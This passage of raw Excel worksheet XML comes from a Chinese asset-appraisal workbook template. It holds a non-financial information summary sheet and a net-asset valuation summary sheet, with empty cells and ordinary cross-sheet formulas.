      <c r="A57" s="55" t="n"/>
      <c r="B57" s="185" t="n"/>
      <c r="C57" s="180" t="n"/>
      <c r="D57" s="629" t="n"/>
      <c r="E57" s="629" t="n"/>
      <c r="F57" s="627" t="n"/>
      <c r="G57" s="627" t="n"/>
      <c r="H57" s="628" t="n"/>
    </row>
    <row r="58" ht="15" customHeight="1" s="415">
      <c r="A58" s="55" t="n"/>
      <c r="B58" s="185" t="n"/>
      <c r="C58" s="180" t="n"/>
      <c r="D58" s="629" t="n"/>
      <c r="E58" s="629" t="n"/>
      <c r="F58" s="627" t="n"/>
      <c r="G58" s="627" t="n"/>
      <c r="H58" s="628" t="n"/>
    </row>
    <row r="59" ht="15" customHeight="1" s="415">
      <c r="A59" s="55" t="n"/>
      <c r="B59" s="185" t="n"/>
      <c r="C59" s="180" t="n"/>
      <c r="D59" s="629" t="n"/>
      <c r="E59" s="629" t="n"/>
      <c r="F59" s="627" t="n"/>
      <c r="G59" s="627" t="n"/>
      <c r="H59" s="628" t="n"/>
    </row>
    <row r="60" ht="15" customHeight="1" s="415">
      <c r="A60" s="55" t="n"/>
      <c r="B60" s="185" t="n"/>
      <c r="C60" s="180" t="n"/>
      <c r="D60" s="629" t="n"/>
      <c r="E60" s="629" t="n"/>
      <c r="F60" s="627" t="n"/>
      <c r="G60" s="627" t="n"/>
      <c r="H60" s="628" t="n"/>
    </row>
    <row r="61" ht="15" customHeight="1" s="415">
      <c r="A61" s="185" t="n"/>
      <c r="B61" s="185" t="n"/>
      <c r="C61" s="180" t="n"/>
      <c r="D61" s="629" t="n"/>
      <c r="E61" s="629" t="n"/>
      <c r="F61" s="627" t="n"/>
      <c r="G61" s="627" t="n"/>
      <c r="H61" s="628" t="n"/>
    </row>
    <row r="62" ht="15" customHeight="1" s="415">
      <c r="A62" s="185" t="n"/>
      <c r="B62" s="185" t="n"/>
      <c r="C62" s="180" t="n"/>
      <c r="D62" s="629" t="n"/>
      <c r="E62" s="629" t="n"/>
      <c r="F62" s="627" t="n"/>
      <c r="G62" s="627" t="n"/>
      <c r="H62" s="628" t="n"/>
    </row>
    <row r="63" ht="15" customHeight="1" s="415">
      <c r="A63" s="185" t="n"/>
      <c r="B63" s="185" t="n"/>
      <c r="C63" s="180" t="n"/>
      <c r="D63" s="629" t="n"/>
      <c r="E63" s="629" t="n"/>
      <c r="F63" s="627" t="n"/>
      <c r="G63" s="627" t="n"/>
      <c r="H63" s="628" t="n"/>
    </row>
    <row r="64" ht="15" customHeight="1" s="415">
      <c r="A64" s="185" t="n"/>
      <c r="B64" s="185" t="n"/>
      <c r="C64" s="180" t="n"/>
      <c r="D64" s="629" t="n"/>
      <c r="E64" s="629" t="n"/>
      <c r="F64" s="627" t="n"/>
      <c r="G64" s="627" t="n"/>
      <c r="H64" s="628" t="n"/>
    </row>
    <row r="65" ht="15" customHeight="1" s="415">
      <c r="A65" s="185" t="n"/>
      <c r="B65" s="185" t="n"/>
      <c r="C65" s="180" t="n"/>
      <c r="D65" s="629" t="n"/>
      <c r="E65" s="629" t="n"/>
      <c r="F65" s="627" t="n"/>
      <c r="G65" s="627" t="n"/>
      <c r="H65" s="628" t="n"/>
    </row>
    <row r="66" ht="15" customHeight="1" s="415">
      <c r="A66" s="185" t="n"/>
      <c r="B66" s="185" t="n"/>
      <c r="C66" s="180" t="n"/>
      <c r="D66" s="629" t="n"/>
      <c r="E66" s="629" t="n"/>
      <c r="F66" s="627" t="n"/>
      <c r="G66" s="627" t="n"/>
      <c r="H66" s="628" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="2">
    <mergeCell ref="A2:H2"/>
    <mergeCell ref="A1:H1"/>
  </mergeCells>
  <conditionalFormatting sqref="A7:A60">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(A7)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="B13:C22">
    <cfRule type="expression" priority="5" dxfId="3">
      <formula>_xlfn.ISFORMULA(B13)</formula>
    </cfRule>
  </conditionalFormatting>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.972222222222222" header="0.3" footer="0.597222222222222"/>
  <pageSetup orientation="landscape" paperSize="9" scale="86"/>
</worksheet>
</file>

<file path=xl/worksheets/sheet110.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet107">
    <tabColor rgb="FFC00000"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr/>
  </sheetPr>
  <dimension ref="A1:G26"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="F9" sqref="F9"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="38.6666666666667" defaultRowHeight="17.6"/>
  <cols>
    <col width="6.33333333333333" customWidth="1" style="415" min="1" max="1"/>
    <col width="15.1666666666667" customWidth="1" style="415" min="2" max="2"/>
    <col width="23.3333333333333" customWidth="1" style="415" min="3" max="3"/>
    <col width="26" customWidth="1" style="415" min="4" max="4"/>
    <col width="22.8333333333333" customWidth="1" style="415" min="5" max="7"/>
    <col width="38.6666666666667" customWidth="1" style="415" min="8" max="8"/>
  </cols>
  <sheetData>
    <row r="1" ht="26" customHeight="1" s="415">
      <c r="A1" s="44" t="inlineStr">
        <is>
          <t>非财务信息汇总表</t>
        </is>
      </c>
    </row>
    <row r="2">
      <c r="A2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3">
      <c r="A3" s="547" t="n"/>
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="548" t="n"/>
    </row>
    <row r="4">
      <c r="A4" s="571">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="B4" s="554" t="n"/>
      <c r="C4" s="554" t="n"/>
      <c r="D4" s="554" t="n"/>
      <c r="E4" s="376" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="402" t="n"/>
    </row>
    <row r="5">
      <c r="A5" s="284" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="B5" s="323" t="inlineStr">
        <is>
          <t>项目编号</t>
        </is>
      </c>
      <c r="C5" s="284" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="D5" s="632" t="inlineStr">
        <is>
          <t>项数（个、套、栋、项）</t>
        </is>
      </c>
      <c r="E5" s="632" t="inlineStr">
        <is>
          <t>面积（平方米）</t>
        </is>
      </c>
      <c r="F5" s="633" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="G5" s="632" t="inlineStr">
        <is>
          <t>文字描述</t>
        </is>
      </c>
    </row>
    <row r="6">
      <c r="A6" s="521" t="inlineStr">
        <is>
          <t>3-1-2</t>
        </is>
      </c>
      <c r="B6" s="56" t="inlineStr">
        <is>
          <t>银行存款</t>
        </is>
      </c>
      <c r="C6" s="57" t="inlineStr">
        <is>
          <t>银行账号数量</t>
        </is>
      </c>
      <c r="D6" s="614" t="n"/>
      <c r="E6" s="560" t="n"/>
      <c r="F6" s="555" t="n"/>
      <c r="G6" s="634" t="n"/>
    </row>
    <row r="7">
      <c r="A7" s="521" t="inlineStr">
        <is>
          <t>3-1-3</t>
        </is>
      </c>
      <c r="B7" s="56" t="inlineStr">
        <is>
          <t>其他货币</t>
        </is>
      </c>
      <c r="C7" s="65" t="inlineStr">
        <is>
          <t>其他货币资金数量</t>
        </is>
      </c>
      <c r="D7" s="614" t="n"/>
      <c r="E7" s="560" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="634" t="n"/>
    </row>
    <row r="8">
      <c r="A8" s="55" t="inlineStr">
        <is>
          <t>4-8-1</t>
        </is>
      </c>
      <c r="B8" s="63" t="inlineStr">
        <is>
          <t>房屋建筑</t>
        </is>
      </c>
      <c r="C8" s="57" t="inlineStr">
        <is>
          <t>房屋建筑物</t>
        </is>
      </c>
      <c r="D8" s="614">
        <f>COUNTA('4-8-1房屋建筑物'!D7:D31)</f>
        <v/>
      </c>
      <c r="E8" s="560">
        <f>'4-8-1房屋建筑物'!H34</f>
        <v/>
      </c>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="634" t="n"/>
    </row>
    <row r="9">
      <c r="A9" s="55" t="inlineStr">
        <is>
          <t>4-8-2</t>
        </is>
      </c>
      <c r="B9" s="63" t="inlineStr">
        <is>
          <t>构筑物</t>
        </is>
      </c>
      <c r="C9" s="57" t="inlineStr">
        <is>
          <t>构筑物</t>
        </is>
      </c>
      <c r="D9" s="614">
        <f>COUNTA('4-8-2构筑物'!C7:C31)</f>
        <v/>
      </c>
      <c r="E9" s="560" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="634" t="n"/>
    </row>
    <row r="10">
      <c r="A10" s="55" t="inlineStr">
        <is>
          <t>4-8-3</t>
        </is>
      </c>
      <c r="B10" s="63" t="inlineStr">
        <is>
          <t>管道沟槽</t>
        </is>
      </c>
      <c r="C10" s="57" t="inlineStr">
        <is>
          <t>管道与沟槽</t>
        </is>
      </c>
      <c r="D10" s="614">
        <f>COUNTA('4-8-3管道沟槽'!C7:C31)</f>
        <v/>
      </c>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="634" t="n"/>
    </row>
    <row r="11">
      <c r="A11" s="55" t="inlineStr">
        <is>
          <t>4-8-4</t>
        </is>
      </c>
      <c r="B11" s="63" t="inlineStr">
        <is>
          <t>机器设备</t>
        </is>
      </c>
      <c r="C11" s="57" t="inlineStr">
        <is>
          <t>机器设备</t>
        </is>
      </c>
      <c r="D11" s="614">
        <f>'4-8-4机器设备'!H34</f>
        <v/>
      </c>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="634" t="n"/>
    </row>
    <row r="12">
      <c r="A12" s="55" t="inlineStr">
        <is>
          <t>4-8-5</t>
        </is>
      </c>
      <c r="B12" s="63" t="inlineStr">
        <is>
          <t>车辆</t>
        </is>
      </c>
      <c r="C12" s="57" t="inlineStr">
        <is>
          <t>车辆</t>
        </is>
      </c>
      <c r="D12" s="614">
        <f>'4-8-5车辆'!G34</f>
        <v/>
      </c>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="634" t="n"/>
    </row>
    <row r="13">
      <c r="A13" s="55" t="inlineStr">
        <is>
          <t>4-8-6</t>
        </is>
      </c>
      <c r="B13" s="63" t="inlineStr">
        <is>
          <t>电子设备</t>
        </is>
      </c>
      <c r="C13" s="57" t="inlineStr">
        <is>
          <t>电子设备</t>
        </is>
      </c>
      <c r="D13" s="614">
        <f>'4-8-6电子设备'!H34</f>
        <v/>
      </c>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="634" t="n"/>
    </row>
    <row r="14">
      <c r="A14" s="55" t="inlineStr">
        <is>
          <t>4-9-1</t>
        </is>
      </c>
      <c r="B14" s="63" t="inlineStr">
        <is>
          <t>土建工程</t>
        </is>
      </c>
      <c r="C14" s="57" t="inlineStr">
        <is>
          <t>在建工程－土建工程</t>
        </is>
      </c>
      <c r="D14" s="614">
        <f>COUNTA('4-9-1在建（土建）'!C6:C26)</f>
        <v/>
      </c>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="634" t="n"/>
    </row>
    <row r="15">
      <c r="A15" s="55" t="inlineStr">
        <is>
          <t>4-9-2</t>
        </is>
      </c>
      <c r="B15" s="56" t="inlineStr">
        <is>
          <t>设备安装</t>
        </is>
      </c>
      <c r="C15" s="57" t="inlineStr">
        <is>
          <t>在建工程－设备安装工程</t>
        </is>
      </c>
      <c r="D15" s="614">
        <f>COUNTA('4-9-2在建（设备）'!C7:C26)</f>
        <v/>
      </c>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="634" t="n"/>
    </row>
    <row r="16">
      <c r="A16" s="55" t="inlineStr">
        <is>
          <t>4-12</t>
        </is>
      </c>
      <c r="B16" s="64" t="inlineStr">
        <is>
          <t>使用资产</t>
        </is>
      </c>
      <c r="C16" s="65" t="inlineStr">
        <is>
          <t>使用权资产</t>
        </is>
      </c>
      <c r="D16" s="614">
        <f>COUNTA('4-12使用权资产'!C6:C29)</f>
        <v/>
      </c>
      <c r="E16" s="560" t="n"/>
      <c r="F16" s="555">
        <f>'4-12使用权资产'!F30</f>
        <v/>
      </c>
      <c r="G16" s="634" t="n"/>
    </row>
    <row r="17">
      <c r="A17" s="55" t="inlineStr">
        <is>
          <t>4-13-1</t>
        </is>
      </c>
      <c r="B17" s="63" t="inlineStr">
        <is>
          <t>土地使用权</t>
        </is>
      </c>
      <c r="C17" s="57" t="inlineStr">
        <is>
          <t>土地使用权</t>
        </is>
      </c>
      <c r="D17" s="614">
        <f>COUNTA('4-13-1无形-土地'!D6:D27)</f>
        <v/>
      </c>
      <c r="E17" s="560">
        <f>'4-13-1无形-土地'!K30</f>
        <v/>
      </c>
      <c r="F17" s="555">
        <f>'4-13-1无形-土地'!L30</f>
        <v/>
      </c>
      <c r="G17" s="634" t="n"/>
    </row>
    <row r="18">
      <c r="A18" s="55" t="inlineStr">
        <is>
          <t>4-13-2</t>
        </is>
      </c>
      <c r="B18" s="66" t="inlineStr">
        <is>
          <t>无形矿权</t>
        </is>
      </c>
      <c r="C18" s="65" t="inlineStr">
        <is>
          <t>矿业权</t>
        </is>
      </c>
      <c r="D18" s="614">
        <f>COUNTA('4-13-2无形-矿业权'!C6:C27)</f>
        <v/>
      </c>
      <c r="E18" s="560" t="n"/>
      <c r="F18" s="555">
        <f>'4-13-2无形-矿业权'!J30</f>
        <v/>
      </c>
      <c r="G18" s="634" t="n"/>
    </row>
    <row r="19">
      <c r="A19" s="55" t="inlineStr">
        <is>
          <t>4-13-3</t>
        </is>
      </c>
      <c r="B19" s="63" t="inlineStr">
        <is>
          <t>无形其他</t>
        </is>
      </c>
      <c r="C19" s="57" t="inlineStr">
        <is>
          <t>无形资产—其他无形资产</t>
        </is>
      </c>
      <c r="D19" s="614">
        <f>COUNTA('4-13-3无形-其他'!C6:C24)</f>
        <v/>
      </c>
      <c r="E19" s="560" t="n"/>
      <c r="F19" s="555">
        <f>'4-13-3无形-其他'!F27</f>
        <v/>
      </c>
      <c r="G19" s="634" t="n"/>
    </row>
    <row r="20">
      <c r="A20" s="55" t="n"/>
      <c r="B20" s="307" t="n"/>
      <c r="C20" s="57" t="n"/>
      <c r="D20" s="614" t="n"/>
      <c r="E20" s="560" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="634" t="n"/>
    </row>
    <row r="21">
      <c r="A21" s="55" t="n"/>
      <c r="B21" s="63" t="inlineStr">
        <is>
          <t>审计机构</t>
        </is>
      </c>
      <c r="C21" s="57" t="inlineStr">
        <is>
          <t>审计机构名称</t>
        </is>
      </c>
      <c r="D21" s="614" t="n"/>
      <c r="E21" s="560" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="634">
        <f>设定信息!B11</f>
        <v/>
      </c>
    </row>
    <row r="22">
      <c r="A22" s="55" t="n"/>
      <c r="B22" s="63" t="inlineStr">
        <is>
          <t>审报文号</t>
        </is>
      </c>
      <c r="C22" s="57" t="inlineStr">
        <is>
          <t>审计报告文号</t>
        </is>
      </c>
      <c r="D22" s="614" t="n"/>
      <c r="E22" s="560" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="634">
        <f>设定信息!B12</f>
        <v/>
      </c>
    </row>
    <row r="23">
      <c r="A23" s="55" t="n"/>
      <c r="B23" s="63" t="inlineStr">
        <is>
          <t>审报意见</t>
        </is>
      </c>
      <c r="C23" s="57" t="inlineStr">
        <is>
          <t>审计报告意见类型</t>
        </is>
      </c>
      <c r="D23" s="614" t="n"/>
      <c r="E23" s="560" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="634">
        <f>设定信息!B13</f>
        <v/>
      </c>
    </row>
    <row r="24">
      <c r="A24" s="55" t="n"/>
      <c r="B24" s="66" t="inlineStr">
        <is>
          <t>审报名称</t>
        </is>
      </c>
      <c r="C24" s="68" t="inlineStr">
        <is>
          <t>审计报告名称</t>
        </is>
      </c>
      <c r="D24" s="614" t="n"/>
      <c r="E24" s="560" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="634">
        <f>设定信息!B14</f>
        <v/>
      </c>
    </row>
    <row r="25">
      <c r="A25" s="55" t="n"/>
      <c r="B25" s="66" t="inlineStr">
        <is>
          <t>审报日期</t>
        </is>
      </c>
      <c r="C25" s="68" t="inlineStr">
        <is>
          <t>审计报告出具日期</t>
        </is>
      </c>
      <c r="D25" s="614" t="n"/>
      <c r="E25" s="560" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="635">
        <f>设定信息!B15</f>
        <v/>
      </c>
    </row>
    <row r="26">
      <c r="A26" s="284" t="n"/>
      <c r="B26" s="307" t="n"/>
      <c r="C26" s="57" t="n"/>
      <c r="D26" s="614" t="n"/>
      <c r="E26" s="560" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="634" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="A2:G2"/>
    <mergeCell ref="A4:D4"/>
    <mergeCell ref="A1:G1"/>
  </mergeCells>
  <pageMargins left="0.75" right="0.75" top="1" bottom="1" header="0.5" footer="0.5"/>
  <pageSetup orientation="portrait" paperSize="1"/>
</worksheet>
</file>

<file path=xl/worksheets/sheet111.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet107108">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr/>
  </sheetPr>
  <dimension ref="A1:H26"/>
  <sheetViews>
    <sheetView zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <selection activeCell="G6" sqref="G6"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="11" defaultRowHeight="17.6"/>
  <cols>
    <col width="5.16666666666667" customWidth="1" style="11" min="1" max="1"/>
    <col width="23.6666666666667" customWidth="1" style="11" min="2" max="2"/>
    <col width="18.6666666666667" customWidth="1" style="12" min="3" max="3"/>
    <col width="29.3333333333333" customWidth="1" style="12" min="4" max="4"/>
    <col width="21.6666666666667" customWidth="1" style="12" min="5" max="5"/>
    <col width="16.8333333333333" customWidth="1" style="12" min="6" max="6"/>
    <col width="16" customWidth="1" style="12" min="7" max="7"/>
    <col width="11.6666666666667" customWidth="1" style="12" min="8" max="8"/>
    <col width="3.5" customWidth="1" style="12" min="9" max="9"/>
    <col width="18" customWidth="1" style="12" min="10" max="10"/>
    <col width="11" customWidth="1" style="12" min="11" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="21.75" customHeight="1" s="415">
      <c r="A1" s="13" t="inlineStr">
        <is>
          <t xml:space="preserve">净  资  产  清  查  评  估  汇  总  表    </t>
        </is>
      </c>
      <c r="B1" s="14" t="n"/>
      <c r="C1" s="14" t="n"/>
      <c r="D1" s="14" t="n"/>
      <c r="E1" s="15" t="n"/>
      <c r="F1" s="14" t="n"/>
      <c r="G1" s="14" t="n"/>
      <c r="H1" s="14" t="n"/>
    </row>
    <row r="2" ht="30.75" customHeight="1" s="415">
      <c r="A2" s="16">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
      <c r="B2" s="14" t="n"/>
      <c r="C2" s="14" t="n"/>
      <c r="D2" s="14" t="n"/>
      <c r="E2" s="14" t="n"/>
      <c r="F2" s="14" t="n"/>
      <c r="G2" s="14" t="n"/>
      <c r="H2" s="17" t="n"/>
    </row>
    <row r="3" ht="24" customHeight="1" s="415">
      <c r="A3" s="16" t="n"/>
      <c r="B3" s="14" t="n"/>
      <c r="C3" s="14" t="n"/>
      <c r="D3" s="14" t="n"/>
      <c r="E3" s="14" t="n"/>
      <c r="F3" s="14" t="n"/>
      <c r="G3" s="14" t="n"/>
      <c r="H3" s="18" t="inlineStr">
        <is>
          <t>检查校对表2</t>
        </is>
      </c>
    </row>
    <row r="4" ht="20.25" customHeight="1" s="415">
      <c r="A4" s="19">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="H4" s="20">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="24" customHeight="1" s="415">
      <c r="A5" s="21" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="B5" s="21" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="C5" s="21" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="D5" s="21" t="inlineStr">
        <is>
          <t>调整后账面值</t>
        </is>
      </c>
      <c r="E5" s="21" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="F5" s="21" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="G5" s="21" t="inlineStr">
        <is>
          <t>增值率</t>
        </is>
      </c>
      <c r="H5" s="21" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="24" customHeight="1" s="415">
      <c r="A6" s="636" t="n">
        <v>1</v>
      </c>
      <c r="B6" s="23" t="inlineStr">
        <is>
          <t xml:space="preserve">  实收资本</t>
        </is>
      </c>
      <c r="C6" s="637" t="n"/>
      <c r="D6" s="637">
        <f>C6</f>
        <v/>
      </c>
      <c r="E6" s="638">
        <f>D6</f>
        <v/>
      </c>
      <c r="F6" s="639">
        <f>E6-D6</f>
        <v/>
      </c>
      <c r="G6" s="639">
        <f>IF(D6=0,"",F6*100/D6)</f>
        <v/>
      </c>
      <c r="H6" s="637" t="n"/>
    </row>
    <row r="7" ht="24" customHeight="1" s="415">
      <c r="A7" s="636" t="n">
        <v>2</v>
      </c>
      <c r="B7" s="23" t="inlineStr">
        <is>
          <t xml:space="preserve">  资本公积</t>
        </is>
      </c>
      <c r="C7" s="637" t="n"/>
      <c r="D7" s="637">
        <f>C7</f>
        <v/>
      </c>
      <c r="E7" s="638">
        <f>D7</f>
        <v/>
      </c>
      <c r="F7" s="639">
        <f>E7-D7</f>
        <v/>
      </c>
      <c r="G7" s="639">
        <f>IF(D7=0,"",F7*100/D7)</f>
        <v/>
      </c>
      <c r="H7" s="637" t="n"/>
    </row>
    <row r="8" ht="24" customHeight="1" s="415">
      <c r="A8" s="636" t="n">
        <v>3</v>
      </c>
      <c r="B8" s="23" t="inlineStr">
        <is>
          <t xml:space="preserve">  盈余公积</t>
        </is>
      </c>
      <c r="C8" s="637" t="n"/>
      <c r="D8" s="637">
        <f>C8</f>
        <v/>
      </c>
      <c r="E8" s="638">
        <f>D8</f>
        <v/>
      </c>
      <c r="F8" s="639">
        <f>E8-D8</f>
        <v/>
      </c>
      <c r="G8" s="639">
        <f>IF(D8=0,"",F8*100/D8)</f>
        <v/>
      </c>
      <c r="H8" s="637" t="n"/>
    </row>
    <row r="9" ht="24" customHeight="1" s="415">
      <c r="A9" s="636" t="n">
        <v>4</v>
      </c>
      <c r="B9" s="23" t="inlineStr">
        <is>
          <t xml:space="preserve">    其中:公益金</t>
        </is>
      </c>
      <c r="C9" s="637" t="n"/>
      <c r="D9" s="637">
        <f>C9</f>
        <v/>
      </c>
      <c r="E9" s="638">
        <f>D9</f>
        <v/>
      </c>
      <c r="F9" s="639">
        <f>E9-D9</f>
        <v/>
      </c>
      <c r="G9" s="639">
        <f>IF(D9=0,"",F9*100/D9)</f>
        <v/>
      </c>
      <c r="H9" s="637" t="n"/>
    </row>
    <row r="10" ht="24" customHeight="1" s="415">
      <c r="A10" s="636" t="n">
        <v>5</v>
      </c>
      <c r="B10" s="23" t="inlineStr">
        <is>
          <t xml:space="preserve">  未分配利润</t>
        </is>
      </c>
      <c r="C10" s="637" t="n"/>
      <c r="D10" s="27">
        <f>C10+D22+E22-G24</f>
        <v/>
      </c>
      <c r="E10" s="27">
        <f>D10</f>
        <v/>
      </c>
      <c r="F10" s="639">
        <f>E10-D10</f>
        <v/>
      </c>
      <c r="G10" s="639">
        <f>IF(D10=0,"",F10*100/D10)</f>
        <v/>
      </c>
      <c r="H10" s="637" t="n"/>
    </row>
    <row r="11" ht="24" customHeight="1" s="415">
      <c r="A11" s="636" t="n"/>
      <c r="B11" s="23" t="n"/>
      <c r="C11" s="637" t="n"/>
      <c r="D11" s="27" t="n"/>
      <c r="E11" s="27" t="n"/>
      <c r="F11" s="639" t="n"/>
      <c r="G11" s="639" t="n"/>
      <c r="H11" s="637" t="n"/>
    </row>
    <row r="12" ht="24" customHeight="1" s="415">
      <c r="A12" s="636" t="n">
        <v>6</v>
      </c>
      <c r="B12" s="23" t="inlineStr">
        <is>
          <t xml:space="preserve">  加:资产评估增值</t>
        </is>
      </c>
      <c r="C12" s="637" t="n"/>
      <c r="D12" s="637" t="n"/>
      <c r="E12" s="638">
        <f>'2-分类汇总'!G39</f>
        <v/>
      </c>
      <c r="F12" s="639">
        <f>E12-D12</f>
        <v/>
      </c>
      <c r="G12" s="639">
        <f>IF(D12=0,"",F12*100/D12)</f>
        <v/>
      </c>
      <c r="H12" s="637" t="n"/>
    </row>
    <row r="13" ht="24" customHeight="1" s="415">
      <c r="A13" s="636" t="n">
        <v>7</v>
      </c>
      <c r="B13" s="522" t="inlineStr">
        <is>
          <t xml:space="preserve">  减:负债评估增值</t>
        </is>
      </c>
      <c r="C13" s="640" t="n"/>
      <c r="D13" s="640" t="n"/>
      <c r="E13" s="638">
        <f>'2-分类汇总'!G64</f>
        <v/>
      </c>
      <c r="F13" s="639">
        <f>E13-D13</f>
        <v/>
      </c>
      <c r="G13" s="639">
        <f>IF(D13=0,"",F13*100/D13)</f>
        <v/>
      </c>
      <c r="H13" s="641" t="n"/>
    </row>
    <row r="14" ht="24" customHeight="1" s="415">
      <c r="A14" s="636" t="n">
        <v>8</v>
      </c>
      <c r="B14" s="31" t="inlineStr">
        <is>
          <t>净资产合计</t>
        </is>
      </c>
      <c r="C14" s="27">
        <f>SUM(C6:C8)+C10+C12-C13</f>
        <v/>
      </c>
      <c r="D14" s="27">
        <f>SUM(D6:D8)+D10+D12-D13</f>
        <v/>
      </c>
      <c r="E14" s="27">
        <f>SUM(E6:E8)+E10+E12-E13</f>
        <v/>
      </c>
      <c r="F14" s="639">
        <f>E14-D14</f>
        <v/>
      </c>
      <c r="G14" s="639">
        <f>IF(D14=0,"",F14*100/D14)</f>
        <v/>
      </c>
      <c r="H14" s="641" t="n"/>
    </row>
    <row r="15" ht="24" customHeight="1" s="415">
      <c r="A15" s="636" t="n">
        <v>9</v>
      </c>
      <c r="B15" s="23" t="n"/>
      <c r="C15" s="640" t="n"/>
      <c r="D15" s="640" t="n"/>
      <c r="E15" s="640" t="n"/>
      <c r="F15" s="639">
        <f>E15-D15</f>
        <v/>
      </c>
      <c r="G15" s="639">
        <f>IF(D15=0,"",F15*100/D15)</f>
        <v/>
      </c>
      <c r="H15" s="641" t="n"/>
    </row>
    <row r="16" ht="24" customHeight="1" s="415">
      <c r="A16" s="636" t="n">
        <v>10</v>
      </c>
      <c r="B16" s="32" t="inlineStr">
        <is>
          <t>总资产</t>
        </is>
      </c>
      <c r="C16" s="642" t="n"/>
      <c r="D16" s="642" t="n"/>
      <c r="E16" s="642" t="n"/>
      <c r="F16" s="639">
        <f>E16-D16</f>
        <v/>
      </c>
      <c r="G16" s="639">
        <f>IF(D16=0,"",F16*100/D16)</f>
        <v/>
      </c>
      <c r="H16" s="641" t="n"/>
    </row>
    <row r="17" ht="24" customHeight="1" s="415">
      <c r="A17" s="636" t="n">
        <v>11</v>
      </c>
      <c r="B17" s="32" t="inlineStr">
        <is>
          <t>总负债</t>
        </is>
      </c>
      <c r="C17" s="642" t="n"/>
      <c r="D17" s="642" t="n"/>
      <c r="E17" s="642" t="n"/>
      <c r="F17" s="639">
        <f>E17-D17</f>
        <v/>
      </c>
      <c r="G17" s="639">
        <f>IF(D17=0,"",F17*100/D17)</f>
        <v/>
      </c>
      <c r="H17" s="641" t="n"/>
    </row>
    <row r="18" ht="24" customHeight="1" s="415">
      <c r="A18" s="636" t="n">
        <v>12</v>
      </c>
      <c r="B18" s="32" t="inlineStr">
        <is>
          <t>净资产</t>
        </is>
      </c>
      <c r="C18" s="642">
        <f>C16-C17</f>
        <v/>
      </c>
      <c r="D18" s="642">
        <f>D16-D17</f>
        <v/>
      </c>
      <c r="E18" s="642">
        <f>E16-E17</f>
        <v/>
      </c>
      <c r="F18" s="639">
        <f>E18-D18</f>
        <v/>
      </c>
      <c r="G18" s="639">
        <f>IF(D18=0,"",F18*100/D18)</f>
        <v/>
      </c>
      <c r="H18" s="641" t="n"/>
    </row>
    <row r="19" ht="24" customHeight="1" s="415">
      <c r="A19" s="636" t="n">
        <v>13</v>
      </c>
      <c r="B19" s="32" t="inlineStr">
        <is>
          <t>差异</t>
        </is>
      </c>
      <c r="C19" s="640">
        <f>C14-C18</f>
        <v/>
      </c>
      <c r="D19" s="640">
        <f>D14-D18</f>
        <v/>
      </c>
      <c r="E19" s="640">
        <f>E14-E18</f>
        <v/>
      </c>
      <c r="F19" s="639">
        <f>E19-D19</f>
        <v/>
      </c>
      <c r="G19" s="639">
        <f>IF(D19=0,"",F19*100/D19)</f>
        <v/>
      </c>
      <c r="H19" s="641" t="n"/>
    </row>
